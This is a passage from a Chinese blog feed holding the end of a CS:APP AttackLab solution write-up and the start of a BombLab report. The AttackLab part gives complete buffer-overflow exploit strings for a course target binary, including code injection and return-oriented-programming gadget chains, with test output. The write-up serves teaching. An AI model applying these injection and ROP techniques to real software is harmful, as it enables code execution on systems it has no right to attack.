0x0000000000401940 &lt;+70&gt;:	mov    <span class="variable">$0x403160</span>,%esi</div><div class="line">   0x0000000000401945 &lt;+75&gt;:	mov    <span class="variable">$0x1</span>,%edi</div><div class="line">   0x000000000040194a &lt;+80&gt;:	mov    <span class="variable">$0x0</span>,%eax</div><div class="line">(gdb) x /16b 0x5561dc90</div><div class="line">0x5561dc90:	53	57	98	57	57	55	102	97</div><div class="line">0x5561dc98:	0	0	0	0	0	0	0	0</div><div class="line">(gdb) nexti</div><div class="line">0x0000000000401916	73	<span class="keyword">in</span> visible.c</div><div class="line">(gdb) x /16b 0x5561dc90</div><div class="line">0x5561dc90:	0	-98	119	-23	120	13	-32	-89</div><div class="line">0x5561dc98:	-112	-36	97	85	0	0	0	0</div></pre></td></tr></table></figure><br>我们可以注意到，在函数touch3调用函数hexmatch的前后，0x5561dc90指向的内存并不是我们一开始注入的cookie的字符串表示，而是被填充了其他的数据。这是由于调用新的函数（hexmatch以及hexmatch调用的函数）使得栈帧继续向下增长，从而覆盖了原先我们注入的数据的原因。</p>
<p>我们可以在gdb中实际的运行一下ctarget来得出执行hexmatch函数到底会覆盖多少栈空间，然后根据结果重写我们的攻击代码。<br>但是我在这里采用了另外一种方法是直接将cookie的字符串表示写到攻击代码的最后，这样，这段字符串将会处于相对的高地址，由于栈的增长方向是从高地址到低地址，这样，注入的字符串将绝对不会因函数调用而被覆盖。</p>
<p>最终，我们的攻击代码如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">30 30 30 30 30 30 30 30</div><div class="line">30 30 30 30 30 30 30 30</div><div class="line">30 30 30 30 30 30 30 30</div><div class="line">30 30 30 30 30 30 30 30</div><div class="line">30 30 30 30 30 30 30 30 /* 前40个字节 */</div><div class="line">a8 dc 61 55 00 00 00 00 /* 返回地址 指向下8个字节 */</div><div class="line">bf c0 dc 61 55 48 83 c4</div><div class="line">10 c3 00 00 00 00 00 00 /* 攻击代码 其中将%rdi指向字符串的首地址（栈的高地址）*/</div><div class="line">fa 18 40 00 00 00 00 00 /* 返回地址 指向函数touch3 */</div><div class="line">35 39 62 39 39 37 66 61 /* cookie的字符串表示 共9个字节（包括<span class="string">'/0'</span>） */</div><div class="line">00</div></pre></td></tr></table></figure><br>用hex2raw生成攻击字符串并测试，结果如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">user@BlackDragon ~/C/A/target1&gt; cat solutions/ctarget/level3/level3.txt|./hex2raw|./ctarget -q</div><div class="line">Cookie: 0x59b997fa</div><div class="line">Type string:Touch3!: You called touch3(<span class="string">"59b997fa"</span>)</div><div class="line">Valid solution <span class="keyword">for</span> level 3 with target ctarget</div><div class="line">PASS: Would have posted the following:</div><div class="line">	user id	bovik</div><div class="line">	course	15213-f15</div><div class="line">	lab	attacklab</div><div class="line">	result	1:PASS:0xffffffff:ctarget:3:30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 A8 DC 61 55 00 00 00 00 BF C0 DC 61 55 48 83 C4 10 C3 00 00 00 00 00 00 FA 18 40 00 00 00 00 00 35 39 62 39 39 37 66 61 00</div></pre></td></tr></table></figure><br>本阶段完成。</p>
<h3 id="第二部分-返回导向编程（Return-Oriented-Programming）攻击"><a href="#第二部分-返回导向编程（Return-Oriented-Programming）攻击" class="headerlink" title="第二部分 返回导向编程（Return-Oriented Programming）攻击"></a>第二部分 返回导向编程（Return-Oriented Programming）攻击</h3><p>为了对抗缓冲区溢出攻击，现代编译器和操作系统采用了很多机制。第二部分的目标文件rtarget就采用了以下两种技术：</p>
<ul>
<li>栈随机化技术，每一次运行程序时，栈的起始位置都是不固定的，几乎不可能确定你攻击代码在栈上的位置。</li>
<li>禁止执行栈上的代码，所以当你尝试将PC指向栈段的时候，程序只能因Segmentation Fault而退出。</li>
</ul>
<p>下面我们引入返回导向编程（Return-Oriented Programming）技术来实现在以上两种限制情况下执行代码。</p>
<p>C语言程序是由若干的函数组成的，每一个函数都以ret结束，下面我们给出一个函数，如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">setval_210</span><span class="params">(<span class="keyword">unsigned</span> *p)</span></span></div><div class="line">&#123;</div><div class="line">	*p = <span class="number">3347663060U</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure><br>以及这个函数的反汇编结果，如下：<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">0000000000400f15 &lt;setval_210&gt;:</div><div class="line">400f15:		c7 <span class="number">07</span> d4 <span class="number">48</span> <span class="number">89</span> c7	movl	<span class="number">$0</span>xc78948d4,(%rdi)</div><div class="line">400f1b:		c3					retq</div></pre></td></tr></table></figure></p>
<p>尽管栈随机化以及禁止在栈段执行代码，但是通过缓冲区溢出攻击，我们仍然可以覆盖返回地址并且让PC跳转至代码段的相应位置。例如让getbuf返回后跳转至0x400f15，尽管这看起来并没有什么意义，因为程序的代码和我们攻击的代码的逻辑是不同的，攻击代码和程序已有代码相同的可能性几乎是0。</p>
<p>现在，让我们换一个思路，如果让getbuf返回后跳转到0x400f18，会怎么样呢？</p>
<p>从0x400f18开始的三个字节48 89 c7代表的是movq %rax, %rdi，然后紧跟的c3代表的是ret。在攻击中，这段代码就比movl $0xc78948d4,(%rdi) ret这样的代码更有意义。并且当这段代码执行完毕，ret又迫使程序跳转到下一个返回地址指向的地方。</p>
<p>现在我们可以利用程序本身的代码，构造出一组由不同的返回地址组成的攻击代码，每一个返回地址都指向了一个函数的最末尾的若干字节，由ret结尾。这样，程序就会按照我们设计的顺序依次执行这些代码片段，以达到修改程序行为的结果，这就是返回导向编程。这些代码片段被称作gadget，而这些gadgets共同组成了一个gadget farm。</p>
<h4 id="等级2-1"><a href="#等级2-1" class="headerlink" title="等级2"></a>等级2</h4><p>在阶段4中，我们将重复阶段2的攻击，只是这一次目标文件为rtarget。为了简化期间，在本次实验中，你仅能从gadget farm中利用movq，popq，ret，nop这四种类型的指令以及x86_64的前8个寄存器（%rax-%rdi）的gadget去构造答案。并且在阶段4中，你只能使用farm.c中start_farm()和mid_farm()之间的gadget来实现攻击。</p>
<p>当一个gadget用到了popq指令，它将会从栈中pop数据，因此，你的攻击代码将会同时包括gadget地址以及数据。</p>
<p>阶段4的思路很简单，我们只要首先从栈中将cookie的8位数字pop到一个寄存器中，再使用mov指令将该寄存器的值送入%rdi中，或者更加直接，将cookie从栈中pop至%rdi中，最后再将返回地址设置为touch2即可。具体要看gadget farm中都提供了哪些gadgets。</p>
<p>我们首先观察gadget_farm中的相关gadgets，并决定其是否可以用作攻击。根据上述的思路，我们可以得到两个gadget set_val426及getval_280，它们的反汇编代码如下：<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">00000000004019c3 &lt;setval_426&gt;:</div><div class="line">  4019c3:       c7 <span class="number">07</span> <span class="number">48</span> <span class="number">89</span> c7 <span class="number">90</span>       movl   <span class="number">$0</span>x90c78948,(%rdi)</div><div class="line">  4019c9:       c3						retq  </div><div class="line"></div><div class="line">00000000004019ca &lt;getval_280&gt;:</div><div class="line">  4019ca:       b8 <span class="number">29</span> <span class="number">58</span> <span class="number">90</span> c3          <span class="keyword">mov</span>    <span class="number">$0</span>xc3905829,%eax</div><div class="line">  4019cf:       c3                      retq   </div></pre></td></tr></table></figure><br>setval_426中的48 89 c7 90 c3可以被解释为mov %rax,%rdi nop ret，而getval_280中的58 90 c3可以被解释为pop %rax nop ret。<br>将这两个gadget结合，即可以得到阶段4的结果，如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">30 30 30 30 30 30 30 30</div><div class="line">30 30 30 30 30 30 30 30</div><div class="line">30 30 30 30 30 30 30 30</div><div class="line">30 30 30 30 30 30 30 30</div><div class="line">30 30 30 30 30 30 30 30 /* 前40个字节 */</div><div class="line">cc 19 40 00 00 00 00 00 /* pop %rax */</div><div class="line">fa 97 b9 59 00 00 00 00 /* cookie */</div><div class="line">c5 19 40 00 00 00 00 00 /* mov %rax,%rdi */</div><div class="line">ec 17 40 00 00 00 00 00 /* touch2 */</div></pre></td></tr></table></figure><br>用hex2raw生成攻击字符串并测试，结果如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">user@BlackDragon ~/C/A/target1&gt; cat solutions/rtarget/level2/level2.txt|./hex2raw|./rtarget -q</div><div class="line">Cookie: 0x59b997fa</div><div class="line">Type string:Touch2!: You called touch2(0x59b997fa)</div><div class="line">Valid solution <span class="keyword">for</span> level 2 with target rtarget</div><div class="line">PASS: Would have posted the following:</div><div class="line">	user id	bovik</div><div class="line">	course	15213-f15</div><div class="line">	lab	attacklab</div><div class="line">	result	1:PASS:0xffffffff:rtarget:2:30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 CC 19 40 00 00 00 00 00 FA 97 B9 59 00 00 00 00 C5 19 40 00 00 00 00 00 EC 17 40 00 00 00 00 00</div></pre></td></tr></table></figure><br>本阶段完成。</p>
<h4 id="等级3-1"><a href="#等级3-1" class="headerlink" title="等级3"></a>等级3</h4><p>在阶段5中，我们将在rtarget中重复阶段3的攻击，即将目标字符串的首地址作为参数传递给函数touch3。这是所有阶段中最难的一个阶段。</p>
<p>首先，考虑到代码段部分以及栈段部分的地址的高4字节都是0，以及x86下任何以32位寄存器作为目标寄存器的指令都会将该寄存器的高4字节置0，我们同样可以使用movl替代movq。</p>
<p>在本阶段中，我们显然是需要将cookie的字符串表示存入栈段的，这个阶段的核心问题是如何定位该字符串的首地址，在栈地址随机的情况下，这是很难的。</p>
<p>首先想到的是利用mov指令将%rsp的值送入另一个寄存器，但是在执行这样的gadget时，寄存器rsp指向的是下一个gadget的返回地址，而不是字符串的首地址，而如果让其指向字符串的首地址，那么又无法在最后返回到函数touch3。</p>
<p>我在做这个实验的时候，在这里卡了很久。最后才注意到在gadget farm中有一个叫做add_xy的函数，这个函数的功能是将%rdi与%rsi相加并保存至%rax，豁然开朗。做题目（进行攻击）的时候还是不能太死板，一定要充分利用目标程序本身提供的代码，一味地按照固有的套路做有时只会浪费时间和精力。</p>
<p>整个阶段5的思路如下，首先将rsp存入某个寄存器之中，然后再将一个特定的常量pop至另一个寄存器之中，最后将这两个值分别存入%rsi和%rdi，调用add_xy将其相加得到字符串的首地址，并将结果%rax存入%rdi之中，最后再调用函数touch3即可。</p>
<p>受制于gadget的种类，我们可能会用到多个gadget做中转。最终的攻击代码如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">30 30 30 30 30 30 30 30</div><div class="line">30 30 30 30 30 30 30 30</div><div class="line">30 30 30 30 30 30 30 30</div><div class="line">30 30 30 30 30 30 30 30</div><div class="line">30 30 30 30 30 30 30 30 /* 前40个字节 */</div><div class="line">06 1a 40 00 00 00 00 00 /* mov %rsp,%rax */</div><div class="line">a2 19 40 00 00 00 00 00 /* mov %rax,%rdi &lt;- %rax指向的地址*/</div><div class="line">ab 19 40 00 00 00 00 00 /* pop %rax */</div><div class="line">48 00 00 00 00 00 00 00 /* offset constant*/</div><div class="line">dd 19 40 00 00 00 00 00 /* mov %eax,%edx */</div><div class="line">34 1a 40 00 00 00 00 00 /* mov %edx,%ecx */</div><div class="line">13 1a 40 00 00 00 00 00 /* mov %ecx,%esi */</div><div class="line">d6 19 40 00 00 00 00 00 /* add_xy */</div><div class="line">a2 19 40 00 00 00 00 00 /* mov %rax,%rdi */</div><div class="line">fa 18 40 00 00 00 00 00 /* touch3 */</div><div class="line">35 39 62 39 39 37 66 61 /* cookie的字符串表示 与前面保存的rsp总共差了9条语句 故常量为0x48*/</div><div class="line">00</div></pre></td></tr></table></figure><br>用hex2raw生成攻击字符串并测试，结果如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">user@BlackDragon ~/C/A/target1&gt; cat solutions/rtarget/level3/level3.txt|./hex2raw|./rtarget -q                </div><div class="line">Cookie: 0x59b997fa</div><div class="line">Type string:Touch3!: You called touch3(<span class="string">"59b997fa"</span>)</div><div class="line">Valid solution <span class="keyword">for</span> level 3 with target rtarget</div><div class="line">PASS: Would have posted the following:</div><div class="line">	user id	bovik</div><div class="line">	course	15213-f15</div><div class="line">	lab	attacklab</div><div class="line">	result	1:PASS:0xffffffff:rtarget:3:30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 06 1A 40 00 00 00 00 00 A2 19 40 00 00 00 00 00 AB 19 40 00 00 00 00 00 48 00 00 00 00 00 00 00 DD 19 40 00 00 00 00 00 34 1A 40 00 00 00 00 00 13 1A 40 00 00 00 00 00 D6 19 40 00 00 00 00 00 A2 19 40 00 00 00 00 00 FA 18 40 00 00 00 00 00 35 39 62 39 39 37 66 61 00</div></pre></td></tr></table></figure><br>本阶段完成。</p>
<blockquote>
<p>注意，在第二部分中，可能使用不同的Gadget去实现相同的攻击效果，答案仅供参考，但并不是唯一的。</p>
</blockquote>
<p>至此，整个实验完成。</p>
<h2 id="实验总结"><a href="#实验总结" class="headerlink" title="实验总结"></a>实验总结</h2><p>相比与BombLab来说，整个AttackLab总体比较简单，主要需要自行阅读讲义中的材料学习相关的攻击方式并将其运用，考虑到讲义中给出的提示，除了阶段5以外整体不是很难。</p>
<p>在这次实验中，主要的两个问题以及收获：</p>
<ul>
<li>字节序的问题，需要对栈的增长方向以及小端法的字节序加以理解。</li>
<li>ROP攻击要充分利用程序本身，而不是循规蹈矩地盲目寻找Gadgets，这样只会在阶段五卡住。</li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;实验答案托管在我的&lt;a href=&quot;https://github.com/BlackDragonF/CSAPPLabs/tree/master/AttackLab&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Github&lt;/a&gt;上&lt;/p&gt;
&lt;blockq
    
    </summary>
    
      <category term="计算机系统" scheme="http://blog.codedragon.tech/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/"/>
    
    
      <category term="实验" scheme="http://blog.codedragon.tech/tags/%E5%AE%9E%E9%AA%8C/"/>
    
      <category term="计算机系统" scheme="http://blog.codedragon.tech/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/"/>
    
  </entry>
  
  <entry>
    <title>深入理解计算机系统BombLab实验报告</title>
    <link href="http://blog.codedragon.tech/2017/04/18/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9FBombLab%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/"/>
    <id>http://blog.codedragon.tech/2017/04/18/深入理解计算机系统BombLab实验报告/</id>
    <published>2017-04-17T16:10:24.000Z</published>
    <updated>2017-04-18T05:21:09.000Z</updated>
    
    <content type="html"><![CDATA[<p>实验答案托管在我的<a href="https://github.com/BlackDragonF/CSAPPLabs/tree/master/BombLab" target="_blank" rel="external">Github</a>上</p>
<blockquote>
<p>用了一周的时间读完了《深入理解计算机系统》的第三章：程序的机器级表示。对于x86_64汇编及其逆向工程有了一定的了解。于2017年4月16日完成了其第二个Lab - Bomb Lab.</p>
</blockquote>
<h2 id="实验简介"><a href="#实验简介" class="headerlink" title="实验简介"></a>实验简介</h2><p>Bomb Lab - Defusing a Binary Bomb主要是关于反汇编的实验，对应于书本的第三章：程序的机器级表示。</p>
<p>本实验非常的有趣。实验给定了一个二进制程序Bomb（炸弹）。这个炸弹由若干阶段组成，每个阶段都要求你在标准输入流中输入一个字符串，如果字符串正确，那么该阶段就会被解除并且程序会进入下一个阶段。如果字符串错误，那么炸弹会爆炸，并且退出。当每个阶段都被解除后，整个炸弹将会被解除。</p>
<p>在正式的实验中，每个学生将会从服务器处得到一个独一无二的炸弹，解除每个炸弹所需要的字符串都是不同的。同时，引爆炸弹将会导致扣分。当实验结束后，可以从服务器的计分板上看到每个学生的成绩。<br>本实验主要要求学生能够理解汇编代码，同时要求学生能学会使用一个Debugger（调试器）。</p>
<p>本实验提供的答案仅针对官网给出的自学者讲义中的<a href="http://csapp.cs.cmu.edu/3e/bomb.tar" target="_blank" rel="external">炸弹</a>。</p>
<h2 id="实验提示"><a href="#实验提示" class="headerlink" title="实验提示"></a>实验提示</h2><ul>
<li>学会使用一个debugger（调试器），在本次实验中，使用GDB - GNU Debugger</li>
<li>使用<code>objdump -t</code>得到bomb的符号表。符号表包含了bomb中所有函数，全局变量，以及调用的函数的名字及地址。</li>
<li>使用<code>objdump -d</code>得到bomb的反汇编结果。但是注意，系统级别的函数调用将会以被加密的形式出现在反汇编代码中，如果需要知道这些信息，需要在gdb中对相应的函数进行反汇编。</li>
</ul>
<h2 id="实验过程及分析"><a href="#实验过程及分析" class="headerlink" title="实验过程及分析"></a>实验过程及分析</h2><h3 id="实验准备"><a href="#实验准备" class="headerlink" title="实验准备"></a>实验准备</h3><ol>
<li>熟悉GDB的使用，并且使用<code>objdump -t bomb &gt; bomb-symboltable</code>生成bomb的符号表，再使用<code>objdump -d bomb &gt; bomb-disassemble</code>生成bomb的反汇编文件。</li>
<li>确保即时输入了错误的字符串炸弹也不会爆炸。观察bomb的符号表可以发现函数explode_bomb，推测该函数的作用是引爆炸弹，因此在GDB中使用break explode_bomb为该函数添加断点。这样，我们可以在bomb爆炸前提前截获并处理。</li>
<li>观察符号表可以看到phase_1到phase_6这几个函数以及其他的相关辅助函数，我们要做的就是给每一个阶段的函数添加断点，反汇编，并且理解这些函数的作用，并推测出答案。</li>
</ol>
<h3 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h3><h4 id="主函数-main"><a href="#主函数-main" class="headerlink" title="主函数 - main"></a>主函数 - main</h4><p>首先在bomb-disassemble中观察main的反汇编代码，如下：<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div></pre></td><td class="code"><pre><div class="line">0000000000400da0 &lt;main&gt;:</div><div class="line">  400da0:       <span class="number">53</span>                      <span class="keyword">push</span>   %rbx</div><div class="line">  400da1:       <span class="number">83</span> ff <span class="number">01</span>                <span class="keyword">cmp</span>    <span class="number">$0</span>x1,%edi</div><div class="line">  400da4:       <span class="number">75</span> <span class="number">10</span>                   <span class="keyword">jne</span>    400db6 &lt;main+<span class="number">0x16</span>&gt;</div><div class="line">  400da6:       <span class="number">48</span> 8b <span class="number">05</span> 9b <span class="number">29</span> <span class="number">20</span> <span class="number">00</span>    <span class="keyword">mov</span>    <span class="number">0x20299b</span>(%rip),%rax        # <span class="number">603748</span> &lt;stdin@@GLIBC_2<span class="meta">.2</span><span class="meta">.5</span>&gt;</div><div class="line">  400dad:       <span class="number">48</span> <span class="number">89</span> <span class="number">05</span> b4 <span class="number">29</span> <span class="number">20</span> <span class="number">00</span>    <span class="keyword">mov</span>    %rax,<span class="number">0x2029b4</span>(%rip)        # <span class="number">603768</span> &lt;infile&gt;</div><div class="line">  400db4:       eb <span class="number">63</span>                   <span class="keyword">jmp</span>    400e19 &lt;main+<span class="number">0x79</span>&gt;</div><div class="line">  400db6:       <span class="number">48</span> <span class="number">89</span> f3                <span class="keyword">mov</span>    %rsi,%rbx</div><div class="line">  400db9:       <span class="number">83</span> ff <span class="number">02</span>                <span class="keyword">cmp</span>    <span class="number">$0</span>x2,%edi</div><div class="line">  400dbc:       <span class="number">75</span> 3a                   <span class="keyword">jne</span>    400df8 &lt;main+<span class="number">0x58</span>&gt;</div><div class="line">  400dbe:       <span class="number">48</span> 8b 7e <span class="number">08</span>             <span class="keyword">mov</span>    <span class="number">0x8</span>(%rsi),%rdi</div><div class="line">  400dc2:       be b4 <span class="number">22</span> <span class="number">40</span> <span class="number">00</span>          <span class="keyword">mov</span>    <span class="number">$0</span>x4022b4,%esi</div><div class="line">  400dc7:       e8 <span class="number">44</span> fe ff ff          callq  400c10 &lt;fopen@plt&gt;</div><div class="line">  400dcc:       <span class="number">48</span> <span class="number">89</span> <span class="number">05</span> <span class="number">95</span> <span class="number">29</span> <span class="number">20</span> <span class="number">00</span>    <span class="keyword">mov</span>    %rax,<span class="number">0x202995</span>(%rip)        # <span class="number">603768</span> &lt;infile&gt;</div><div class="line">  400dd3:       <span class="number">48</span> <span class="number">85</span> c0                <span class="keyword">test</span>   %rax,%rax</div><div class="line">  400dd6:       <span class="number">75</span> <span class="number">41</span>                   <span class="keyword">jne</span>    400e19 &lt;main+<span class="number">0x79</span>&gt;</div><div class="line">  400dd8:       <span class="number">48</span> 8b 4b <span class="number">08</span>             <span class="keyword">mov</span>    <span class="number">0x8</span>(%rbx),%rcx</div><div class="line">  400ddc:       <span class="number">48</span> 8b <span class="number">13</span>                <span class="keyword">mov</span>    (%rbx),%rdx</div><div class="line">  400ddf:       be b6 <span class="number">22</span> <span class="number">40</span> <span class="number">00</span>          <span class="keyword">mov</span>    <span class="number">$0</span>x4022b6,%esi</div><div class="line">  400de4:       bf <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          <span class="keyword">mov</span>    <span class="number">$0</span>x1,%edi</div><div class="line">  400de9:       e8 <span class="number">12</span> fe ff ff          callq  400c00 &lt;__printf_chk@plt&gt;</div><div class="line">  400dee:       bf <span class="number">08</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          <span class="keyword">mov</span>    <span class="number">$0</span>x8,%edi</div><div class="line">  400df3:       e8 <span class="number">28</span> fe ff ff          callq  400c20 &lt;exit@plt&gt;</div><div class="line">  400df8:       <span class="number">48</span> 8b <span class="number">16</span>                <span class="keyword">mov</span>    (%rsi),%rdx</div><div class="line">  400dfb:       be d3 <span class="number">22</span> <span class="number">40</span> <span class="number">00</span>          <span class="keyword">mov</span>    <span class="number">$0</span>x4022d3,%esi</div><div class="line">  400e00:       bf <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          <span class="keyword">mov</span>    <span class="number">$0</span>x1,%edi</div><div class="line">  400e05:       b8 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          <span class="keyword">mov</span>    <span class="number">$0</span>x0,%eax</div><div class="line">  400e0a:       e8 f1 fd ff ff          callq  400c00 &lt;__printf_chk@plt&gt;</div><div class="line">  400e0f:       bf <span class="number">08</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          <span class="keyword">mov</span>    <span class="number">$0</span>x8,%edi</div><div class="line">  400e14:       e8 <span class="number">07</span> fe ff ff          callq  400c20 &lt;exit@plt&gt;</div><div class="line">  400e19:       e8 <span class="number">84</span> <span class="number">05</span> <span class="number">00</span> <span class="number">00</span>          callq  4013a2 &lt;initialize_bomb&gt;</div><div class="line">  400e1e:       bf <span class="number">38</span> <span class="number">23</span> <span class="number">40</span> <span class="number">00</span>          <span class="keyword">mov</span>    <span class="number">$0</span>x402338,%edi</div><div class="line">  400e23:       e8 e8 fc ff ff          callq  400b10 &lt;puts@plt&gt;</div><div class="line">  400e28:       bf <span class="number">78</span> <span class="number">23</span> <span class="number">40</span> <span class="number">00</span>          <span class="keyword">mov</span>    <span class="number">$0</span>x402378,%edi</div><div class="line">  400e2d:       e8 de fc ff ff          callq  400b10 &lt;puts@plt&gt;</div><div class="line">  400e32:       e8 <span class="number">67</span> <span class="number">06</span> <span class="number">00</span> <span class="number">00</span>          callq  40149e &lt;read_line&gt;</div><div class="line">  400e37:       <span class="number">48</span> <span class="number">89</span> c7                <span class="keyword">mov</span>    %rax,%rdi</div><div class="line">  400e3a:       e8 a1 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          callq  400ee0 &lt;phase_1&gt;</div><div class="line">  400e3f:       e8 <span class="number">80</span> <span class="number">07</span> <span class="number">00</span> <span class="number">00</span>          callq  4015c4 &lt;phase_defused&gt;</div><div class="line">  400e44:       bf a8 <span class="number">23</span> <span class="number">40</span> <span class="number">00</span>          <span class="keyword">mov</span>    <span class="number">$0</span>x4023a8,%edi</div><div class="line">  400e49:       e8 c2 fc ff ff          callq  400b10 &lt;puts@plt&gt;</div><div class="line">  400e4e:       e8 4b <span class="number">06</span> <span class="number">00</span> <span class="number">00</span>          callq  40149e &lt;read_line&gt;</div><div class="line">  400e53:       <span class="number">48</span> <span class="number">89</span> c7                <span class="keyword">mov</span>    %rax,%rdi</div><div class="line">  400e56:       e8 a1 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          callq  400efc &lt;phase_2&gt;</div><div class="line">  400e5b:       e8 <span class="number">64</span> <span class="number">07</span> <span class="number">00</span> <span class="number">00</span>          callq  4015c4 &lt;phase_defused&gt;</div><div class="line">  400e60:       bf ed <span class="number">22</span> <span class="number">40</span> <span class="number">00</span>          <span class="keyword">mov</span>    <span class="number">$0</span>x4022ed,%edi</div><div class="line">  400e65:       e8 a6 fc ff ff          callq  400b10 &lt;puts@plt&gt;</div><div class="line">  400e6a:       e8 2f <span class="number">06</span> <span class="number">00</span> <span class="number">00</span>          callq  40149e &lt;read_line&gt;</div><div class="line">  400e6f:       <span class="number">48</span> <span class="number">89</span> c7                <span class="keyword">mov</span>    %rax,%rdi</div><div class="line">  400e72:       e8 cc <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          callq  400f43 &lt;phase_3&gt;</div><div class="line">  400e77:       e8 <span class="number">48</span> <span class="number">07</span> <span class="number">00</span> <span class="number">00</span>          callq  4015c4 &lt;phase_defused&gt;</div><div class="line">  400e7c:       bf <span class="number">0b</span> <span class="number">23</span> <span class="number">40</span> <span class="number">00</span>          <span class="keyword">mov</span>    <span class="number">$0</span>x40230b,%edi</div><div class="line">  400e81:       e8 8a fc ff ff          callq  400b10 &lt;puts@plt&gt;</div><div class="line">  400e86:       e8 <span class="number">13</span> <span class="number">06</span> <span class="number">00</span> <span class="number">00</span>          callq  40149e &lt;read_line&gt;</div><div class="line">  400e8b:       <span class="number">48</span> <span class="number">89</span> c7                <span class="keyword">mov</span>    %rax,%rdi</div><div class="line">  400e8e:       e8 <span class="number">79</span> <span class="number">01</span> <span class="number">00</span> <span class="number">00</span>          callq  40100c &lt;phase_4&gt;</div><div class="line">  400e93:       e8 2c <span class="number">07</span> <span class="number">00</span> <span class="number">00</span>          callq  4015c4 &lt;phase_defused&gt;</div><div class="line">  400e98:       bf d8 <span class="number">23</span> <span class="number">40</span> <span class="number">00</span>          <span class="keyword">mov</span>    <span class="number">$0</span>x4023d8,%edi</div><div class="line">  400e9d:       e8 6e fc ff ff          callq  400b10 &lt;puts@plt&gt;</div><div class="line">  400ea2:       e8 f7 <span class="number">05</span> <span class="number">00</span> <span class="number">00</span>          callq  40149e &lt;read_line&gt;</div><div class="line">  400ea7:       